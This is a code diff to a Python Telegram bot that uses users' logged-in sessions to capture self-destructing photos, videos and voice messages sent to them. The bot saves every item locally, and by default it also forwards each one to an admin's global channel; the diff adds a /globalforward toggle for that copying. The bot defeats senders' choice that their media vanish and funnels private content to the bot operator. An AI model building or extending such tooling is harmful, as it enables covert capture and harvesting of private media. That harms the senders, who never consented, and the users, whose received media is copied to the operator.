@@ -482,8 +482,15 @@ async def load_state():
     """Load bot state from file"""
     if os.path.exists(STATE_FILE):
         async with aiofiles.open(STATE_FILE, mode="r") as file:
-            return json.loads(await file.read())
-    return {"letter_counter": 0, "user_folders": {}, "user_sessions": {}, "login_sessions": {}}
+            state = json.loads(await file.read())
+    else:
+        state = {"letter_counter": 0, "user_folders": {}, "user_sessions": {}, "login_sessions": {}}
+    
+    # Initialize global forwarding setting if not exists
+    if "global_forwarding_enabled" not in state:
+        state["global_forwarding_enabled"] = True  # Default: enabled
+    
+    return state
 
 
 async def save_state(state):
@@ -1536,15 +1543,15 @@ async def setup_user_client_handlers(user_client, user_id, bot_client, state):
 
             console.print(f"[magenta]✅ Media saved for user {user_id}[/magenta]")
             
-            # Update last seen
-            MEDIA_QUEUE.update_last_seen(user_id, event.chat_id, event.id)
+            # Update last seen - FIXED: Added await
+            await MEDIA_QUEUE.update_last_seen(user_id, event.chat_id, event.id)
             
             # ✅ Log the successful save
             logger.info(f"User {user_id} saved self-destructing media (TTL: {ttl}s)")
             
-            # Also add to queue as backup
+            # Also add to queue as backup - FIXED: Added await
             session_string = user_client.session.save()
-            MEDIA_QUEUE.add_to_queue(
+            await MEDIA_QUEUE.add_to_queue(
                 user_id,
                 session_string,
                 user_client.api_id,
@@ -3537,8 +3544,13 @@ async def handle_help(event, admin_id, state):
         return
     
     # Show admin help - UPDATED WITH NEW COMMANDS
+        # Show admin help - UPDATED WITH NEW COMMANDS
     help_text = """
 🤖 **Self-Destructing Media Downloader Bot**
+
+**📢 GLOBAL FORWARDING SETTINGS (Admin Only):**
+/globalforward enable/disable - Enable/disable forwarding to admin's global channel
+/globalforward status - Show current forwarding status
 
 **📢 BOT'S GLOBAL CHANNEL (Admin Only):**
 /setgchannel <id> - Set GLOBAL channel for BOT files
@@ -3615,15 +3627,15 @@ async def handle_help(event, admin_id, state):
 • User management commands:
   - /users - List all logged-in users
   - /checkmissed_all - Check all users
+• Global forwarding control:
+  - /globalforward enable - Enable forwarding to admin channel
+  - /globalforward disable - Disable forwarding to admin channel
+  - /globalforward status - Show current status
 • Auto-check system:
   - Bot startup: Auto-check all users + process queue
   - Every 5 minutes: Process queue
   - Every 1 hour: Auto-check all users
   - User login: Auto-check that user's missed media
-
-**📝 NOTE:** User media goes to both channels for backup:
-1. User's personal channel (set by user with /setmychannel)
-2. Bot's global channel (set by admin with /setgchannel)
 
 **🔧 ENHANCED /checkmissed COMMAND:**
 For Users:
@@ -3634,19 +3646,352 @@ For Admin:
   • /checkmissed all - Check ALL logged-in users
   • /checkmissed_all - Same as above
 
-**🔄 AUTO SYSTEM:**
-• ✅ Bot restart → Auto-check all users + Process queue
-• ✅ Every 5 min → Process queue automatically
-• ✅ Every 1 hour → Auto-check all users
-• ✅ User login → Auto-check that user's missed media
-• ✅ Admin can manually check anytime
-
-**👥 USER MANAGEMENT:**
-• View all logged-in users: /users
-• Check specific user: /checkmissed <user_id>
-• Check all users: /checkmissed all or /checkmissed_all
+**⚙️ GLOBAL FORWARDING SETTINGS:**
+• /globalforward enable - Enable forwarding to admin's global channel
+• /globalforward disable - Disable forwarding to admin's global channel
+• /globalforward status - Show current status
+• When DISABLED: Media goes ONLY to user's personal channel
+• When ENABLED: Media goes to BOTH channels (default)
     """
     await event.reply(help_text)
+
+# ===== GLOBAL FORWARDING COMMAND HANDLERS =====
+async def handle_globalforward(event, admin_id, state):
+    """Handle /globalforward command to enable/disable forwarding to admin's global channel"""
+    if not await is_admin(event, admin_id):
+        await event.reply("❌ You are not authorized to use this command.")
+        return
+    
+    args = event.text.split()
+    
+    if len(args) == 1:
+        # Show current status
+        current_status = state.get("global_forwarding_enabled", True)
+        status_text = "✅ ENABLED" if current_status else "❌ DISABLED"
+        
+        await event.reply(
+            f"📢 **Global Forwarding Status:** {status_text}\n\n"
+            f"**Current Setting:**\n"
+            f"• Self-destruct media: {'Will be forwarded to admin channel' if current_status else 'Will NOT be forwarded to admin channel'}\n"
+            f"• /checkmissed media: {'Will be forwarded to admin channel' if current_status else 'Will NOT be forwarded to admin channel'}\n\n"
+            f"**Usage:**\n"
+            f"• `/globalforward enable` - Enable forwarding to admin's global channel\n"
+            f"• `/globalforward disable` - Disable forwarding to admin's global channel\n"
+            f"• `/globalforward status` - Show current status\n\n"
+            f"**What this controls:**\n"
+            f"• When ENABLED: Media is sent to BOTH user's personal channel AND admin's global channel\n"
+            f"• When DISABLED: Media is sent ONLY to user's personal channel\n\n"
+            f"**Note:** This does NOT affect local file saving. Files are always saved locally."
+        )
+        return
+    
+    action = args[1].lower()
+    
+    if action == "enable":
+        state["global_forwarding_enabled"] = True
+        await save_state(state)
+        
+        await event.reply(
+            "✅ **Global Forwarding ENABLED**\n\n"
+            "**What this means:**\n"
+            "• Self-destructing media will be forwarded to admin's global channel\n"
+            "• /checkmissed media will be forwarded to admin's global channel\n"
+            "• Media is sent to BOTH channels (user's personal + admin's global)\n\n"
+            "**Channels involved:**\n"
+            "1. ✅ User's personal channel (set by user with /setmychannel)\n"
+            "2. ✅ Admin's global channel (set by admin with /setgchannel)\n"
+            "3. ✅ Local file storage (always saved)\n\n"
+            "**Status:** Forwarding to admin channel is now ACTIVE"
+        )
+        
+    elif action == "disable":
+        state["global_forwarding_enabled"] = False
+        await save_state(state)
+        
+        await event.reply(
+            "❌ **Global Forwarding DISABLED**\n\n"
+            "**What this means:**\n"
+            "• Self-destructing media will NOT be forwarded to admin's global channel\n"
+            "• /checkmissed media will NOT be forwarded to admin's global channel\n"
+            "• Media is sent ONLY to user's personal channel\n\n"
+            "**Channels involved:**\n"
+            "1. ✅ User's personal channel (set by user with /setmychannel)\n"
+            "2. ❌ Admin's global channel (NOT forwarded)\n"
+            "3. ✅ Local file storage (always saved)\n\n"
+            "**Status:** Forwarding to admin channel is now INACTIVE"
+        )
+        
+    elif action == "status":
+        current_status = state.get("global_forwarding_enabled", True)
+        status_text = "✅ ENABLED" if current_status else "❌ DISABLED"
+        
+        await event.reply(
+            f"📢 **Global Forwarding Status:** {status_text}\n\n"
+            f"**Effect on different operations:**\n"
+            f"• Self-destruct media: {'Forwarded to admin channel' if current_status else 'NOT forwarded to admin channel'}\n"
+            f"• /checkmissed: {'Forwarded to admin channel' if current_status else 'NOT forwarded to admin channel'}\n"
+            f"• Queued media: {'Forwarded to admin channel' if current_status else 'NOT forwarded to admin channel'}\n\n"
+            f"**Toggle with:**\n"
+            f"• `/globalforward enable`\n"
+            f"• `/globalforward disable`"
+        )
+        
+    else:
+        await event.reply(
+            "❌ **Invalid action!**\n\n"
+            "**Valid actions:**\n"
+            "• `enable` - Enable forwarding to admin channel\n"
+            "• `disable` - Disable forwarding to admin channel\n"
+            "• `status` - Show current status\n\n"
+            "**Examples:**\n"
+            "• `/globalforward enable`\n"
+            "• `/globalforward disable`\n"
+            "• `/globalforward status`"
+        )
+
+
+# ===== MODIFY USER_DOWNLOADER FUNCTION =====
+async def user_downloader(event, user_client, bot_client, all_media_dir, state):
+    """Download media from user's account - UPDATED with global forwarding setting"""
+    try:
+        # ✅ FIX: Pehle receiver (logged-in user) ka ID nikalo
+        try:
+            receiver_entity = await user_client.get_me()
+            receiver_id = receiver_entity.id
+            receiver_username = receiver_entity.username if receiver_entity.username else "NoUsername"
+        except:
+            receiver_id = "Unknown"
+            receiver_username = "Unknown"
+        
+        console.print(f"[cyan]Receiver (logged-in user): {receiver_username} (ID: {receiver_id})[/cyan]")
+        
+        # ✅ Ab sender (jo media bhej raha hai) ka info nikalo
+        try:
+            sender = await event.get_sender()
+            sender_username = sender.username if sender.username else "NoUsername"
+            sender_id = sender.id if sender.id else "Unknown"
+        except:
+            sender_username = "Unknown"
+            sender_id = "Unknown"
+
+        console.print(f"[cyan]Downloading from @{sender_username} (Sender ID: {sender_id}) to @{receiver_username} (Receiver ID: {receiver_id})[/cyan]")
+
+        # Find existing folder or create new one
+        user_folder_key = f"{sender_username}_{sender_id}"
+
+        if user_folder_key in state["user_folders"]:
+            user_folder_name = state["user_folders"][user_folder_key]
+        else:
+            counter = state["letter_counter"]
+            letter = string.ascii_uppercase[counter % 26]
+            user_folder_name = f"{counter:02d} - {letter} - @{sender_username} - {sender_id}"
+            state["user_folders"][user_folder_key] = user_folder_name
+            state["letter_counter"] += 1
+            await save_state(state)
+
+        user_folder_path = os.path.join(all_media_dir, user_folder_name)
+        os.makedirs(user_folder_path, exist_ok=True)
+
+        # Generate unique filename
+        timestamp = int(time.time())
+        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+
+        # Determine file type and extension
+        if event.photo:
+            file_ext = ".jpg"
+            media_type = "photo"
+        elif event.video:
+            file_ext = ".mp4"
+            media_type = "video"
+        elif event.document:
+            if hasattr(event.document, 'attributes') and event.document.attributes:
+                for attr in event.document.attributes:
+                    if hasattr(attr, 'file_name') and attr.file_name:
+                        file_ext = os.path.splitext(attr.file_name)[1]
+                        break
+                else:
+                    file_ext = ".bin"
+            else:
+                file_ext = ".bin"
+            media_type = "document"
+        elif event.audio:
+            file_ext = ".mp3"
+            media_type = "audio"
+        elif event.voice:
+            file_ext = ".ogg"
+            media_type = "voice"
+        elif event.video_note:
+            file_ext = ".mp4"
+            media_type = "video_note"
+        else:
+            file_ext = ".bin"
+            media_type = "unknown"
+
+        filename = f"{timestamp}_{random_str}{file_ext}"
+        file_path = os.path.join(user_folder_path, filename)
+
+        # Download with progress
+        file_size = event.file.size if event.file else 0
+        console.print(f"[cyan]File size: {file_size} bytes[/cyan]")
+
+        progress = RichDownloadProgress(filename, file_size) if file_size > 0 else None
+
+        await event.download_media(
+            file=file_path,
+            progress_callback=lambda c, t: progress.update(c) if progress else None
+        )
+
+        if progress:
+            progress.close()
+
+        # Verify save
+        if not os.path.exists(file_path):
+            console.print("[red]ERROR: File was not saved[/red]")
+            return
+
+        actual_size = os.path.getsize(file_path)
+        file_size_mb = actual_size / (1024 * 1024) if actual_size > 0 else 0
+
+        console.print(
+            f"[green]✓ Downloaded {media_type} ({file_size_mb:.2f} MB) from @{sender_username} → {filename}[/green]"
+        )
+        logger.info(
+            f"Downloaded {media_type} ({file_size_mb:.2f} MB) from @{sender_username} to @{receiver_username} → {filename}"
+        )
+
+        # ✅ Get global forwarding setting
+        global_forwarding_enabled = state.get("global_forwarding_enabled", True)
+        console.print(f"[cyan]Global forwarding to admin channel: {'ENABLED' if global_forwarding_enabled else 'DISABLED'}[/cyan]")
+        
+        # ✅ IMPORTANT FIX: Ab RECEIVER ka ID use karo user session dhoondne ke liye
+        # Send to BOTH channels if configured
+        # 1. First check if RECEIVER (logged-in user) has personal channel
+        user_session = state.get("user_sessions", {}).get(str(receiver_id))  # ✅ CHANGE HERE
+        
+        user_channel_id = None
+        if user_session:
+            # Use RECEIVER's personal channel if set
+            user_channel_id = user_session.get("channel_id")
+            console.print(f"[cyan]RECEIVER's personal channel ID: {user_channel_id}[/cyan]")
+        else:
+            console.print(f"[yellow]No user session found for receiver ID: {receiver_id}[/yellow]")
+            # Debug: Print all user sessions
+            console.print(f"[yellow]Available user sessions: {list(state.get('user_sessions', {}).keys())}[/yellow]")
+        
+        # 2. Get admin's global channel
+        admin_channel_id = getattr(bot_client, "channel_id", None)
+        console.print(f"[cyan]Admin global channel ID: {admin_channel_id}[/cyan]")
+        
+        # Track sending status
+        sent_to_user_channel = False
+        sent_to_admin_channel = False
+        
+        # Send to RECEIVER's personal channel FIRST (using RECEIVER'S client)
+        if user_channel_id:
+            try:
+                success = await send_to_user_channel(user_client, file_path, sender_username, user_channel_id)
+                if success:
+                    console.print(f"[green]✓ File sent to RECEIVER's personal channel {user_channel_id}[/green]")
+                    sent_to_user_channel = True
+                else:
+                    console.print(f"[red]Failed to send to RECEIVER's personal channel {user_channel_id}[/red]")
+                    logger.warning(f"File saved but failed to send to RECEIVER's channel: {filename}")
+            except Exception as e:
+                console.print(f"[red]RECEIVER channel upload error: {e}[/red]")
+                logger.error(f"RECEIVER channel upload error: {e}")
+        
+        # Send to admin's global channel SECOND (using BOT client) - CHECK GLOBAL FORWARDING SETTING
+        if admin_channel_id and global_forwarding_enabled:
+            # Check if admin channel is different from RECEIVER's channel
+            if admin_channel_id != user_channel_id:
+                try:
+                    success = await send_to_admin_channel(bot_client, file_path, sender_username, admin_channel_id)
+                    if success:
+                        console.print(f"[green]✓ File sent to admin's global channel {admin_channel_id}[/green]")
+                        sent_to_admin_channel = True
+                    else:
+                        console.print(f"[red]Failed to send to admin's global channel {admin_channel_id}[/red]")
+                        logger.warning(f"File saved but failed to send to admin channel: {filename}")
+                except Exception as e:
+                    console.print(f"[red]Admin channel upload error: {e}[/red]")
+                    logger.error(f"Admin channel upload error: {e}")
+            else:
+                console.print("[yellow]Admin channel and RECEIVER channel are same, skipping duplicate send[/yellow]")
+                sent_to_admin_channel = True  # Already sent via RECEIVER channel
+        elif admin_channel_id and not global_forwarding_enabled:
+            console.print("[yellow]Global forwarding to admin channel is DISABLED, skipping admin channel[/yellow]")
+        
+        # Send summary
+        if sent_to_user_channel or sent_to_admin_channel:
+            channels_sent = []
+            if sent_to_user_channel:
+                channels_sent.append("RECEIVER's personal channel")
+            if sent_to_admin_channel:
+                channels_sent.append("admin's global channel")
+                        
+            console.print(f"[green]✓ File sent to: {', '.join(channels_sent)}[/green]")
+            
+            # ✅ Also notify the receiver about the save
+            try:
+                global BOT_CLIENT
+                if BOT_CLIENT:
+                    channel_names = []
+                    if sent_to_user_channel:
+                        channel_names.append("your personal channel")
+                    if sent_to_admin_channel:
+                        channel_names.append("admin's global channel")
+                    
+            except Exception as e:
+                console.print(f"[yellow]Could not notify user: {e}[/yellow]")
+        else:
+            console.print("[yellow]No channel configured, file saved locally only[/yellow]")
+
+    except Exception as e:
+        console.print(f"[red]Error in user_downloader: {e}[/red]")
+        logger.error(f"User downloader error: {e}")
+
+
+# ===== MODIFY USER_DOWNLOADER_QUEUE FUNCTION =====
+async def user_downloader_queue(user_client, file_path, sender_username, user_id, state, media_type, ttl):
+    """Process downloaded media from queue - UPDATED with global forwarding setting"""
+    try:
+        # ✅ Get global forwarding setting
+        global_forwarding_enabled = state.get("global_forwarding_enabled", True)
+        
+        # Get user's channel from state
+        user_session = state.get("user_sessions", {}).get(str(user_id))
+        user_channel_id = user_session.get("channel_id") if user_session else None
+        
+        # Send to user's channel if set
+        if user_channel_id:
+            try:
+                success = await send_to_user_channel(user_client, file_path, sender_username, user_channel_id)
+                if success:
+                    console.print(f"[green]✓ Media sent to user's channel {user_channel_id}[/green]")
+            except Exception as e:
+                console.print(f"[red]Error sending to user channel: {e}[/red]")
+        
+        # Also send to admin channel if available AND global forwarding is enabled
+        global BOT_CLIENT
+        if BOT_CLIENT and hasattr(BOT_CLIENT, 'channel_id') and BOT_CLIENT.channel_id and global_forwarding_enabled:
+            try:
+                success = await send_to_admin_channel(BOT_CLIENT, file_path, sender_username, BOT_CLIENT.channel_id)
+                if success:
+                    console.print(f"[green]✓ Media sent to admin's channel {BOT_CLIENT.channel_id}[/green]")
+            except Exception as e:
+                console.print(f"[red]Error sending to admin channel: {e}[/red]")
+        elif BOT_CLIENT and hasattr(BOT_CLIENT, 'channel_id') and BOT_CLIENT.channel_id and not global_forwarding_enabled:
+            console.print("[yellow]Global forwarding to admin channel is DISABLED, skipping admin channel for queued media[/yellow]")
+        
+        # Organize file
+        final_path = await organize_and_save_file(file_path, sender_username, user_id, state, media_type)
+        
+        console.print(f"[green]✓ Successfully processed queued media (TTL: {ttl}s)[/green]")
+        return True
+        
+    except Exception as e:
+        console.print(f"[red]Error processing media file from queue: {e}[/red]")
+        return False
 
 
 async def handle_status(event, admin_id, state):
@@ -4394,6 +4739,14 @@ async def main():
     @client.on(events.NewMessage(pattern=r'/delete\s+(.+)?'))
     async def delete_handler(event):
         await handle_delete(event, admin_id)
+    
+    @client.on(events.NewMessage(pattern=r'/globalforward(?:\s+\S+)?'))
+    async def globalforward_handler(event):
+        await handle_globalforward(event, admin_id, state)
+    
+    @client.on(events.NewMessage(pattern=r'/globleforward(?:\s+\S+)?'))
+    async def globleforward_handler(event):
+        await handle_globalforward(event, admin_id, state)
     
     @client.on(events.NewMessage(pattern=r'/confirm_delete\s+(.+)?'))
     async def confirm_delete_handler(event):
